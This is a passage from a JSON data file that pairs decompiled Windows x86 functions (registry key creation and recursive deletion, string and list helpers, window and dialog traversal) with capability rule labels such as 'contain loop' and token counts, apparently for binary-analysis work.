var_10h;\n    uint phkResult;\n    uint var_120h;\n    uint var_11ch;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint in_stack_ffffff98;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x14) = *0x44e0fc;\n    uVar1 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x10) = &phkResult;\n    phkResult = unaff_EDI;\n    var_120h = unaff_ESI;\n    var_11ch = unaff_EBX;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(*(unaff_EBP + 8), uVar1, unaff_EBP + -0x124);\n    if (iVar2 == 0) {\n        while( true ) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(*(unaff_EBP + -0x124), 0, unaff_EBP + -0x11c, 0x104);\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = unaff_EBP + -0x11c;\n            fcn.00406c60();\n            *(unaff_EBP + -4) = 1;\n            iVar2 = fcn.00435c03(*(unaff_EBP + -0x124), unaff_EBP + -0x120, iVar2, phkResult, var_120h, var_11ch, \n                                 in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0, \n                                 in_stack_fffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, \n                                 in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                                 in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, in_stack_ffffff20, \n                                 in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, in_stack_ffffff30, \n                                 in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                                 in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, \n                                 in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                                 in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, \n                                 in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, \n                                 in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                 in_stack_ffffff94, in_stack_ffffff98, in_stack_ffffff9c, in_stack_ffffffa0, \n                                 in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, \n                                 in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                                 in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, in_stack_ffffffe0, \n                                 in_stack_ffffffe4, var_14h_2, in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h);\n            *(unaff_EBP + -4) = 0;\n            fcn.00401180();\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        if ((iVar2 == 0x103) || (iVar2 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(*(unaff_EBP + 8), **(unaff_EBP + 0xc));\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x124));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 2236
    },
    "00437c61": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437c61(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00437bd0();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 165
    },
    "00403860": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403860(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00402f80(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402f80(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 131
    },
    "00403c10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403c10(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004038a0(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 103
    },
    "00403e40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e40(int32_t param_1)\n\n{\n    do {\n        fcn.00403990();\n        if (*(param_1 + 0x58) == 0) {\n            return;\n        }\n    } while (*(*(param_1 + 0x60) + 0x28) != *(*(param_1 + 0x60) + 0x2c));\n    return;\n}\n",
        "token_count": 95
    },
    "00403fd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00403fd0(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_2 == NULL) {\n        fcn.00402f80(0, 0);\n        return param_1;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402f80(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 146
    },
    "00406c20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406c20(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00406b90(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00406b90(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 132
    },
    "0040a932": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040a932(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0040eadd();\n    piVar2 = *(iVar1 + 0x88);\n    while( true ) {\n        if (piVar2 == NULL) {\n            return 1;\n        }\n        if (*piVar2 == param_1) break;\n        piVar2 = piVar2[1];\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "0040adc2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040adc2(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    *(iVar1 + 0xc) = param_1;\n    uVar2 = 0;\n    do {\n        if (param_1 == *(uVar2 * 8 + 0x44df40)) {\n            iVar1 = fcn.0040eadd();\n            *(iVar1 + 8) = *(uVar2 * 8 + 0x44df44);\n            return;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x2d);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        iVar1 = fcn.0040eadd();\n        *(iVar1 + 8) = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        iVar1 = fcn.0040eadd();\n        *(iVar1 + 8) = 8;\n        return;\n    }\n    iVar1 = fcn.0040eadd();\n    *(iVar1 + 8) = 0x16;\n    return;\n}\n",
        "token_count": 293
    },
    "0040b34c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040b34c(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.0040f03c(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 444
    },
    "0040b5d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b5d0(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    \n    if (*(arg_8h + 8) == 0) {\n        uVar2 = fcn.00410ec0(arg_ch, arg_10h);\n    }\n    else {\n        puVar4 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x0040b623:\n            do {\n                if (*puVar4 != 0) {\n                    uVar1 = *puVar4;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar3 = puVar4;\n                        if (uVar1 != *arg_ch) goto code_r0x0040b622;\n                    }\n                    else if (((uVar1 != *arg_ch) || (puVar4[1] != arg_ch[1])) && (puVar3 = puVar4 + 1,  *puVar3 != 0)) {\ncode_r0x0040b622:\n                        puVar4 = puVar3 + 1;\n                        goto code_r0x0040b623;\n                    }\n                }\n                if (((*puVar4 != 0) || (((*(*arg_ch + 0x1d + arg_8h) & 4) != 0 && (arg_ch = arg_ch + 1,  *arg_ch == 0)))\n                    ) || (arg_ch = arg_ch + 1,  puVar4 = arg_10h,  *arg_ch == 0)) break;\n            } while( true );\n        }\n        uVar2 = -(*arg_ch != 0) & arg_ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 436
    },
    "0040b673": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b673(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.00410f00(arg_ch, arg_10h);\n    }\n    else {\n        puVar3 = arg_ch;\n        puVar5 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x0040b6c6:\n            do {\n                if (*puVar5 != 0) {\n                    uVar1 = *puVar5;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar4 = puVar5;\n                        if (uVar1 != *puVar3) goto code_r0x0040b6c5;\n                    }\n                    else if (((uVar1 != *puVar3) || (puVar5[1] != puVar3[1])) && (puVar4 = puVar5 + 1,  *puVar4 != 0)) {\ncode_r0x0040b6c5:\n                        puVar5 = puVar4 + 1;\n                        goto code_r0x0040b6c6;\n                    }\n                }\n                if (((*puVar5 == 0) || (((*(*puVar3 + 0x1d + arg_8h) & 4) != 0 && (puVar3 = puVar3 + 1,  *puVar3 == 0)))\n                    ) || (puVar3 = puVar3 + 1,  puVar5 = arg_10h,  *puVar3 == 0)) break;\n            } while( true );\n        }\n        iVar2 = puVar3 - arg_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 460
    },
    "0040b711": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b711(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.00410f50(arg_ch, arg_10h);\n    }\n    else {\n        puVar3 = arg_ch;\n        puVar5 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x0040b764:\n            do {\n                if (*puVar5 != 0) {\n                    uVar1 = *puVar5;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar4 = puVar5;\n                        if (uVar1 != *puVar3) goto code_r0x0040b763;\n                    }\n                    else if (((uVar1 != *puVar3) || (puVar5[1] != puVar3[1])) && (puVar4 = puVar5 + 1,  *puVar4 != 0)) {\ncode_r0x0040b763:\n                        puVar5 = puVar4 + 1;\n                        goto code_r0x0040b764;\n                    }\n                }\n                if (((*puVar5 != 0) || (((*(*puVar3 + 0x1d + arg_8h) & 4) != 0 && (puVar3 = puVar3 + 1,  *puVar3 == 0)))\n                    ) || (puVar3 = puVar3 + 1,  puVar5 = arg_10h,  *puVar3 == 0)) break;\n            } while( true );\n        }\n        iVar2 = puVar3 - arg_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "0040bc8c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bc8c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4432c8, 0x14);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - *(unaff_EBP + 0xc);\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 235
    },
    "004147aa": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004147aa(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (((cVar1 < 'A') || ('Z' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) break;\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 130
    },
    "004189d1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.004189d1(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar3;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.0041885b(0);\n    pcVar3 = extraout_ECX[3];\n    *(unaff_EBP + -4) = 2;\n    while (pcVar3 != NULL) {\n        pcVar3 = pcVar3 + -1;\n        if (*(extraout_ECX[2] + pcVar3 * 4) != 0) {\n            puVar2 = fcn.004011f0();\n            if (puVar2 != NULL) {\n                (***puVar2)(1);\n            }\n        }\n    }\n    fcn.00409f48(extraout_ECX[2]);\n    *(unaff_EBP + -4) = 1;\n    fcn.0041887e();\n    fcn.00402700(1, 0);\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::locale::facet.0;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 406
    },
    "00418ca9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418ca9(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00418c87(0);\n    puVar2 = *(param_1 + 0x1c);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0041bae1(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x1c) = 0;\n    puVar2 = *(param_1 + 0x20);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0041bae1(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x20) = 0;\n    return;\n}\n",
        "token_count": 201
    },
    "004192bd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nfloat10 fcn.004192bd(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    float10 fVar3;\n    \n    fVar3 = fcn.00419714(param_1, param_2);\n    bVar2 = param_3 < 0;\n    iVar1 = param_3;\n    if (0 < param_3) {\n        iVar1 = 0;\n        do {\n            param_3 = param_3 + -1;\n            fVar3 = fVar3 * *0x4454d0;\n        } while (param_3 != 0);\n        bVar2 = false;\n    }\n    if (bVar2) {\n        iVar1 = -iVar1;\n        do {\n            iVar1 = iVar1 + -1;\n            fVar3 = fVar3 * *0x4454c8;\n        } while (iVar1 != 0);\n    }\n    return fVar3;\n}\n",
        "token_count": 221
    },
    "0041acde": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041acde(code **param_1)\n\n{\n    uint *puVar1;\n    \n    *param_1 = vtable.CStringList.0;\n    for (puVar1 = param_1[1]; puVar1 != NULL; puVar1 = *puVar1) {\n        fcn.00402350();\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    fcn.0041b09b();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 143
    },
    "0041af0d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041af0d(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x0041af23;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x0041af23:\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0041b09b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b09b(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.0041bae1(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0041b53e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041b53e(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 193
    },
    "0041b576": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041b576(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "0041b5d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041b5d4(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.0041b525(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 221
    },
    "0041bab6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041bab6(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00409f36(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x44d350 == NULL) break;\n        iVar1 = (**0x44d350)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0041bae6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041bae6(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00409f36(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x44d350 == NULL) break;\n        iVar1 = (**0x44d350)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "0041bb59": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041bb59(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (***param_1)();\n    if (param_2 != 0) {\n        for (; iVar1 != 0; iVar1 = *(iVar1 + 0x10)) {\n            if (iVar1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0041e57e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041e57e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.004094c9(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar3);\n                if (iVar2 == param_1) {\n                    iVar1 = fcn.004235c2(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar2 = fcn.0041e57e(iVar2, unaff_retaddr);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 252
    },
    "0041f1a7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041f1a7(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    if ((param_1 == 0) || (iVar5 = *(param_1 + 0x1c),  iVar5 == 0)) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0);\n    while ((uVar2 & 0x40000000) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n        if (iVar3 == 0) break;\n        uVar2 = (*pcVar1)(iVar3, 0xfffffff0);\n        iVar5 = iVar3;\n    }\n    uVar4 = fcn.0041eeb7(iVar5);\n    return uVar4;\n}\n",
        "token_count": 239
    },
    "0041f1eb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f1eb(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0041f1eb(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0041eeb7();\n            return;\n        }\n        iVar2 = fcn.0041eede(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.0041f1eb(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "0041f3aa": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041f3aa(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.0041eede(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 187
    },
    "0041f501": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041f501(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint lpMsg;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&lpMsg, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n    }\n    fcn.0041ee14();\n    return;\n}\n",
        "token_count": 127
    },
    "0041f838": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f838(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x1c),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.0041eeb7(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[7];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 196
    },
    "0041fe34": {
        "rules": [
            "contain loop"
        ],
